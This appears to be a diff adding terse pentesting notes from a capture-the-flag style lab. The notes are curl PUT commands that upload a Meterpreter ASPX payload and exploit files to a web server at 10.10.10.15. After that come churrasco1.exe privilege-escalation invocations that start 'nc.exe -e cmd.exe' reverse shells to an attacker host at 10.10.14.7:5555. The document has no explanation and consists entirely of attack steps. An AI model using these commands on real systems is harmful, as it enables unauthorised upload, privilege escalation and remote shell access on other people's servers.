@@ -1,0 +1,13 @@
+		<<><><><> curl <><><><><><
+
+
+curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx 
+
+curl -X PUT http://10.10.10.15/met.txt -d @met.aspx
+
+
+churrasco1.exe -d "\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.7 5555"
+
+curl -X PUT http://10.10.10.15/chrrasco1.txt --data-binary @churrasco1.txt
+
+churrasco1.exe -d "\inetpub\wwwroot\este.exe -e cmd.exe 10.10.14.7 5555"
